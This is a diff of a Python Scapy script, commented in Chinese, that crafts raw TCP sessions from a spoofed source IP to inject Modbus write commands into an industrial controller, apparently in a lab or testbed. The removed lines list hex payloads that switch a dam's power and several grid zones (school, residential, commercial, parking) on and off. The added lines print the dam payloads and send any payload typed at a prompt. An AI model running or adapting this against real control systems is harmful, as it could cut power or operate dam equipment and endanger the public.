@@ -40,9 +40,8 @@ def reset_iptables(source_ip):
 
 # 這邊是發送Modbus TCP Payloads的函數
 # 修改時需要注意ACK-SEQ的值，以避免中斷
-# Delay 可以設間隔時間
 
-def sendModbusPayloads(cmdList, target_ip="192.168.1.5", source_ip="192.168.1.20", target_port=502, delay=0):
+def sendModbusPayloads(cmd, target_ip="192.168.1.5", source_ip="192.168.1.20", target_port=502):
     # TCP 三向交握
     ip = IP(dst=target_ip, src=source_ip)
     syn = TCP(
@@ -72,34 +71,32 @@ def sendModbusPayloads(cmdList, target_ip="192.168.1.5", source_ip="192.168.1.20
     ack_num = ack.ack
     trans_id = 0
     
-    for cmd in cmdList:
-        print(f"---------\nSent: \n{cmd}\n---------\n")
-        modbus_data = bytes.fromhex(cmd)
-        modbus_packet = ip/TCP(
-            sport=ack.sport,
-            dport=target_port,
-            flags='PA',
-            seq=seq,
-            ack=ack_num
-        )/modbus_data
+    print(f"---------\nSent: \n{cmd}\n---------\n")
+    modbus_data = bytes.fromhex(cmd)
+    modbus_packet = ip/TCP(
+        sport=ack.sport,
+        dport=target_port,
+        flags='PA',
+        seq=seq,
+        ack=ack_num
+    )/modbus_data
 
-        # 發送Modbus TCP packet
-        response = sr1(modbus_packet)
-        seq += len(modbus_data)
-        ack_num = response.seq + len(response.load)  # 改進，加上接收到的資料長度
+    # 發送Modbus TCP packet
+    response = sr1(modbus_packet)
+    seq += len(modbus_data)
+    ack_num = response.seq + len(response.load)  # 改進，加上接收到的資料長度
 
-        print(response.show())
+    print(response.show())
 
-        # 收到後回覆一個ACK
-        ack = TCP(
-            sport=response.dport,
-            dport=target_port,
-            flags='A',
-            seq=response.ack,  # 改為使用對方的確認號作為序列號
-            ack=ack_num        # 確認號現在應包括接收到的負載長度
-        )
-        send(ip/ack)
-        sleep(delay)
+    # 收到後回覆一個ACK
+    ack = TCP(
+        sport=response.dport,
+        dport=target_port,
+        flags='A',
+        seq=response.ack,  # 改為使用對方的確認號作為序列號
+        ack=ack_num        # 確認號現在應包括接收到的負載長度
+    )
+    send(ip/ack)
 
 
     # 發送FIN封包以開始關閉連線
@@ -127,38 +124,15 @@ def sendModbusPayloads(cmdList, target_ip="192.168.1.5", source_ip="192.168.1.20
 # nothing   00e80000000b01420200060000f0960001
 # 水壩start 6dca0000000e01420300090000006400010001ff
 # 水壩off   6dca0000000e0142030009000000640001000100
-
-# 開關水壩的電
-cmdList = ["00000000000e01420300090000006400010001ff",
-           "00010000000e0142030009000000640001000100"]
-
-# 電網操作
-cmd_all_on = [
-    "07520000000e01420300090000025e00010001ff",  # 學校左
-    "078e0000000e01420300090000026200010001ff",  # 學校右
-    "c7dd0000000e01420300090000026300010001ff",  # rolad&park
-    "d1350000000e01420300090000026500010001ff",  # 住宅左
-    "3ddf0000000e01420300090000a01600010001ff",  # 商辦區右
-    "37110000000e01420300090000026700010001ff",  # 商辦區左
-    "317f0000000e01420300090000026600010001ff",  # 停車場右
-    "2aa30000000e01420300090000026000010001ff",  # 停車場左
-]
-cmd_all_off = [
-    "07520000000e01420300090000025e0001000100",  # 學校左
-    "078e0000000e0142030009000002620001000100",  # 學校右
-    "c7dd0000000e0142030009000002630001000100",  # rolad&park
-    "d1350000000e0142030009000002650001000100",  # 住宅左
-    "37110000000e0142030009000002670001000100",  # 商辦區左
-    "3ddf0000000e01420300090000a0160001000100",  # 商辦區右
-    "2aa30000000e0142030009000002600001000100",  # 停車場左
-    "317f0000000e0142030009000002660001000100",  # 停車場右
-]
+print("水壩start 6dca0000000e01420300090000006400010001ff")
+print("水壩off   6dca0000000e0142030009000000640001000100")
 
 setup_iptables(source_ip)
 
 try:
-    sendModbusPayloads(cmd_all_on, target_ip, source_ip, target_port, delay=0.5)
-    sendModbusPayloads(cmd_all_off, target_ip, source_ip, target_port)
+    while True:
+        cmd=input("請輸入Modbus TCP Payload: ")
+        sendModbusPayloads(cmd, target_ip, source_ip, target_port)
 except Exception as e:
     print("[ERROR]傳送Modbus資料過程中發生錯誤:", e)
 
